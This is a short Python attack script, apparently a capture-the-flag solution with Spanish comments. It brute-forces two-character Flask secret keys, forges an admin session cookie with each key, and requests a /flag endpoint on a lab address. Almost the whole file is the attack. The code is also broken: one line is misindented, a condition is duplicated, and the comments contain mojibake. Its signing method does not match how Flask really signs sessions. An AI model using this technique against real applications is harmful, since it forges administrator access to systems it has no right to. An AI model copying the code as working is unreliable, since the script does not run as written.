import itertools
import string
import requests
from itsdangerous import URLSafeTimedSerializer

# Funci贸n para generar una cookie de sesi贸n firmada
def encode_flask_cookie(secret_key, session_data):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(session_data)

# Datos de la sesi贸n que queremos establecer
session_data = {'name': 'admin'}

# Generar todas las posibles combinaciones de claves de 2 caracteres
possible_keys = [''.join(p) for p in itertools.product(string.printable, repeat=2)]

# URL de tu aplicaci贸n Flask
url = "http://172.18.0.3:5000/flag"

# Probar todas las claves posibles
print("vamos al for")
for key in possible_keys:
    try:
        print("intentamos ")
        cookie = encode_flask_cookie(key, session_data)
        response = requests.get(url, cookies={'session': cookie})
              print(key)
        # Verificar si la respuesta contiene la flag
        if "flag{" in response.text in response.text:
            print(f"Found valid key: {key}")
            print(f"Response: {response.text}")
            break
    except Exception as e:
        pass
